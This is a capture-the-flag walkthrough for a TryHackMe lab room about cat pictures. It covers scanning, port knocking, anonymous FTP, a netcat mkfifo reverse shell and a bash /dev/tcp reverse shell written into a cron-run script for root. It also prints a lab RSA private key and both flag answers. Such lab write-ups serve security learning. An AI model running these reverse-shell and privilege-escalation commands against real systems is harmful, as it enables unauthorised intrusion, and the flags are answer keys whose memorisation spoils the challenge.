# Bebop Walkthrough
### Link
- https://tryhackme.com/room/catpictures
---
### Recon
```
nmap -sC -sC -Pn [IP]
```
**Namp scan result**
```
Stats: 0:35:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:20 (0:00:22 remaining)
Nmap scan report for 10.10.62.2
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE      VERSION
21/tcp filtered ftp
22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
4420/tcp open  nvm-express?
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck:
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open  http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4420-TCP:V=7.91%I=7%D=4/14%Time=6258BA01%P=x86_64-apple-darwin17.7.
SF:0%r(NULL,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20com
SF:mands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers
SF:\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20c
SF:trl-c\nPlease\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20
SF:SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20wor
SF:k\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x
SF:20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x2
SF:0password:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRe
SF:quest,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20comman
SF:ds\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x2
SF:0are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl
SF:-c\nPlease\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection
SF:\x20Closed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x
SF:20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\
SF:x20the\x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\nd
SF:o\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20pas
SF:sword\.\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHE
SF:LL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x
SF:20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20a
SF:t\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20pa
SF:ssword:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck
SF:,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x2
SF:0do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\
SF:x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nP
SF:lease\x20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20
SF:SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20wor
SF:k\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x
SF:20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x2
SF:0password:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

3 Ports: **ftp** on **21** **filtered**,  **SSH** on **22** **open**, **HTTP** on **8080** **open**

**Gobuster**
```
sudo gobuster dir -u http://[IP]:8080 -w [PATH]/directory-list-2.3-medium.txt
```
**Gobuster scan result**
```
===============================================================
2022/04/14 19:48:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 238] [--> http://10.10.62.2:8080/images/]
/download             (Status: 301) [Size: 240] [--> http://10.10.62.2:8080/download/]
/docs                 (Status: 301) [Size: 236] [--> http://10.10.62.2:8080/docs/]
/files                (Status: 403) [Size: 199]
/feed                 (Status: 200) [Size: 1444]
/store                (Status: 403) [Size: 199]
/assets               (Status: 301) [Size: 238] [--> http://10.10.62.2:8080/assets/]
/bin                  (Status: 301) [Size: 235] [--> http://10.10.62.2:8080/bin/]
/includes             (Status: 403) [Size: 199]
/language             (Status: 301) [Size: 240] [--> http://10.10.62.2:8080/language/]
/cache                (Status: 403) [Size: 199]
/vendor               (Status: 301) [Size: 238] [--> http://10.10.62.2:8080/vendor/]
/config               (Status: 403) [Size: 199]
/styles               (Status: 301) [Size: 238] [--> http://10.10.62.2:8080/styles/]
/licenses             (Status: 301) [Size: 240] [--> http://10.10.62.2:8080/licenses/]
/ext                  (Status: 301) [Size: 235] [--> http://10.10.62.2:8080/ext/]
/phpbb                (Status: 301) [Size: 237] [--> http://10.10.62.2:8080/phpbb/]
/adm                  (Status: 301) [Size: 235] [--> http://10.10.62.2:8080/adm/]
```
---
### Exploration

Let's check the URL : http://[IP]:8080/

We can see the main page of Blog or Forum.Interesting information regarding the framework used to build this page. **https://www.phpbb.com/**

Continue to gather information and try some basic things ^^

Now let's try to register --> Not Work.

I tried to read the post name "post cat pictures here!". After clicked onthis post, I obtained the answer:
```
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```
A really useful link to understand [Port Knocking](https://en.wikipedia.org/wiki/Port_knocking). Another great resource to understand how to bypass it [Port Knocking 2](https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html?q=)

Now the objective: try the port knocking 

- First: Install knockd
- Second: Execute the command
```
or i in {1..10}; for x in 1111 2222 3333 4444; do nc 10.10.62.2 $x; done                                                                     1 ⨯
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 1111 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 2222 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 3333 (?) : Connection refused
(UNKNOWN) [10.10.62.2] 4444 (?) : Connection refused
```
- Third: Check the port status with **nmap** during the command execution in the previous step
```
nmap -p 21 10.10.62.2
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-14 20:22 EDT
Nmap scan report for 10.10.62.2
Host is up (0.11s latency).

PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```
- Fourth: Try to access the ftp
```
ftp 10.10.62.2
Connected to 10.10.62.2.
220 (vsFTPd 3.0.3)
Name (10.10.62.2:laurentnebout): anonymous
230 Login successful.
ftp>
```
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> get note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (162 bytes).
WARNING! 4 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
162 bytes received in 0.000194 seconds (815 kbytes/s)
```
Let's check this **note.txt**
```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

It is time to connect with the new information we found
```
nc 10.10.62.2 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
```
```
ls -la
total 56
drwxr-xr-x 10 1001 1001 4096 Apr  3  2021 .
drwxr-xr-x 10 1001 1001 4096 Apr  3  2021 ..
-rw-------  1 1001 1001   50 Apr  1  2021 .bash_history
-rw-r--r--  1 1001 1001  220 Apr  1  2021 .bash_logout
-rw-r--r--  1 1001 1001 3771 Apr  1  2021 .bashrc
-rw-r--r--  1 1001 1001  807 Apr  1  2021 .profile
drwxrwxr-x  2 1001 1001 4096 Apr  2  2021 bin
drwxr-xr-x  2    0    0 4096 Apr  1  2021 etc
drwxr-xr-x  3    0    0 4096 Apr  2  2021 home
drwxr-xr-x  3    0    0 4096 Apr  2  2021 lib
drwxr-xr-x  2    0    0 4096 Apr  1  2021 lib64
drwxr-xr-x  2    0    0 4096 Apr  2  2021 opt
drwxr-xr-x  2    0    0 4096 Apr  3  2021 tmp
drwxr-xr-x  4    0    0 4096 Apr  2  2021 usr
```
The current shell is too complicated to use.Let's try to improve the situation by creating a reverse shell

**Attacked Machine**
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.96.167 4646 >/tmp/f  
```
**Local machine**
```
nc -nlvp 4646
```
```
nc -nlvp 4646
Connection from 10.10.62.2:37916
/bin/sh: 0: can't access tty; job control turned off
# pwd
/
# ls -l
total 32
drwxrwxr-x 2 1001 1001 4096 Apr  2  2021 bin
drwxr-xr-x 2    0    0 4096 Apr  1  2021 etc
drwxr-xr-x 3    0    0 4096 Apr  2  2021 home
drwxr-xr-x 3    0    0 4096 Apr  2  2021 lib
drwxr-xr-x 2    0    0 4096 Apr  1  2021 lib64
drwxr-xr-x 2    0    0 4096 Apr  2  2021 opt
drwxr-xr-x 2    0    0 4096 Apr 15 00:57 tmp
drwxr-xr-x 4    0    0 4096 Apr  2  2021 usr
# cd home
# pwd
/home
# ls -l
total 4
drwxr-xr-x 2 0 0 4096 Apr  3  2021 catlover
# cd catlover
# ls -la
total 28
drwxr-xr-x 2 0 0  4096 Apr  3  2021 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
```
I tried to execute the file but it doesn't work so I send it to the locale machine

**Attacked Machine**
```
 nc [Local Machine IP] 4545 < /home/catlover/runme
```

**Local Machine**
```
nc -nlvp 4545 > runme
Connection from 10.10.62.2:36888
```
---
### Analyse File

We have the file **runme** in our local machine so let's check it.
```
strings runme
...............
rebecca
Please enter yout password:
Welcome, catlover! SSH key transfer queued!
touch /tmp/gibmethesshkey
Access Denied
...............
```

With the password **rebecca**, we can try it in the Attacked Machine
```
# ./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued!
```

I found the SSH key here
```
cat /home/catlover/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
```

Create a file **id_rsa** and paste the **RSA Private Key**. Don't forget to change the permission
```
chmod 600 id_rsa
```

Let's save the key in the Local machine and try to access the Targeted machine
```
sudo ssh -i id_rsa catlover@10.10.62.2
The authenticity of host '10.10.62.2 (10.10.62.2)' can't be established.
ED25519 key fingerprint is SHA256:1eaD00/uot2wrnOhWADr5ZbjIDs9twYBymqkwtQKXk0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.62.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 14 18:15:42 PDT 2022

  System load:  0.08               Users logged in:                0
  Usage of /:   37.3% of 19.56GB   IP address for eth0:            10.10.62.2
  Memory usage: 35%                IP address for br-98674f8f20f9: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    107


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/#
``` 
```
root@7546fa2336d6:/# cd root
root@7546fa2336d6:/root# ls
flag.txt
root@7546fa2336d6:/root# cat flag.txt
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
```
**Question**
#### Flag1
**Answer** 
#### 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
---
### Privilege escalation

During the first exploration, I found  **.bash_history**
```
root@7546fa2336d6:/# ls -la
total 108
drwxr-xr-x   1 root root 4096 Mar 25  2021 .
drwxr-xr-x   1 root root 4096 Mar 25  2021 ..
-rw-------   1 root root  588 Jun  4  2021 .bash_history
```
```
root@7546fa2336d6:/# cat .bash_history
exit
exit
exit
exit
exit
exit
exit
ip a
ifconfig
apt install ifconfig
ip
exit
nano /opt/clean/clean.sh
ping 192.168.4.20
apt install ping
apt update
apt install ping
apt install iptuils-ping
apt install iputils-ping
exit
ls
cat /opt/clean/clean.sh
nano /opt/clean/clean.sh
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh
cat /opt/clean/clean.sh
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
cat /var/log/dpkg.log
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
exit
exit
exit
```

Check **clean.sh**
```
root@7546fa2336d6:/# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
```

We can edit this script and use it to create a reverse shell

```
root@7546fa2336d6:/# echo "bash -i >& /dev/tcp/10.6.96.167/2345 0>&1" > clean.sh
root@7546fa2336d6:/# cat clean.sh
bash -i >& /dev/tcp/10.6.96.167/2345 0>&1
```

Start a listener
```
nc -nlvp 2345
```

Wait until I obtained the access
```
Connection from 10.10.42.1 35448 received!
bash: cannot set terminal process group (5261): Inappropriate ioctl for device
bash: no job control in this shell
root@cat-pictures:~# whoami
whoami
root
root@cat-pictures:~# cat /root/root.txt
cat /root/root.txt
Congrats!!!
Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476
root@cat-pictures:~# 
```
**Question**
#### Flag2
**Answer** 
#### 4a98e43d78bab283938a06f38d2ca3a3c53f0476

